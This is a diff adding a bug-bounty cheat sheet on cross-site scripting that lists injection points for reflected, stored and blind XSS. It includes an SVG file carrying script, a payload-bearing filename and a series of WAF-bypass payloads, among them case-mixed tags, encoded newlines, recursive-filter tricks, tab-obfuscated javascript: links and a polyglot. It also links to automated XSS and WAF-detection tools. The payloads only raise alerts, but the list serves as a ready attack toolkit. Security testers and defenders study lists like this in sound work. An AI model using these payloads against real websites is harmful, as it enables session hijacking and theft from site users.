@@ -1,0 +1,107 @@
+##BugBountyTips ##Cross_Site_Scripting
+
+Author : @NovanAR
+GitHub : https://github.com/novanazizr
+
+Reflected XSS Tips
+
+1. Try to find any reflected page or parameters using view source code
+2. Find any hidden parameters using Arjun / FFUF
+3. Try to input this url in url parameter, example :
+	
+	https://vuln.me/url?=http://brutelogic.com.br/poc.svg
+
+Stored XSS Tips
+
+1. Try to input payloads while registering on a site in fields like username, name, address, email, etc.
+2. Try in Comment section anywhere on target site.
+3. Try on every input fields which get reflected in page and which can be seen by other users.
+4. Try to signup using your name + xss payload and that can lead to stored xss.
+
+Check WAF 
+
+1. https://github.com/0xInfection/Awesome-WAF
+2. https://github.com/Ekultek/WhatWaf
+3. https://github.com/EnableSecurity/wafw00f
+
+Blind XSS Tips
+
+1. Common Targets for Blind XSS
+
+	- Review forms
+    - Contact Us pages
+    - Passwords(You never know if the other side doesn’t properly handle input and if your password is in view mode)
+  	- Address fields of e-commerce sites
+	- First or Last Name field while doing Credit Card Payments
+	- Log Viewers
+	- Feedback Page
+	- Chat Applications
+	- Any app that requires user moderation
+    - Customer ticket applications
+
+2. Try to input Blind XSS payloads on User-Agent header
+3. Try to input Blind XSS payloads on Referer header
+4. Try to input Blind XSS payloads on User Invitations
+
+File Upload XSS Tips
+
+1. Arbitraty File Upload
+
+	- Create a file using the following code :
+
+<?xml version="1.0" standalone="no"?>
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
+<polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
+<script type="text/javascript">
+alert(document.location);
+</script>
+</svg>
+
+	- Save it as .SVG file, example : poc.svg
+    - Upload it on any upload documents
+
+2. XSS on filename, example : "><img src=x onerror=prompt(document.domain)>.txt
+
+
+XSS Firewall Bypass Techniques
+
+	Check if the firewall is blocking only lowercase
+
+		<scRipT>alert(1)</scRipT>
+
+	Try to break firewall regex with the new line(\r\n)
+
+		<script>%0alert(1)</script>
+
+    Try Double Encoding
+
+		%2522
+
+    Testing for recursive filters, if firewall removes text in red, we will have clear payload
+
+ 		<src<script>ipt>alert(1);</scr</script>ipt>
+
+    Injecting anchor tag without whitespaces
+
+ 		<a/href="j&Tab;a&Tab;v&Tab;asc&Tab;ri&Tab;pt:alert&lpar;1&rpar;">
+
+    Try to bypass whitespaces using Bullet
+
+		<svg•onload=alert(1)>
+
+    Try to change request method
+
+		GET /?q=xss  POST/?q=xss
+
+	Try XSS polyglot
+    	%0ajavascript:`/*\"/*-->&lt;svg onload='/*</template></noembed></noscript></style></title></textarea></script><html onmouseover="/**/ 
+
+Web Function Tips
+
+https://pastebin.com/SicF1QHx
+
+Automated XSS Tools
+
+1. https://github.com/theinfosecguy/QuickXSS
+2. https://github.com/hahwul/dalfox
+3. https://github.com/shawarkhanethicalhacker/BruteXSS-1
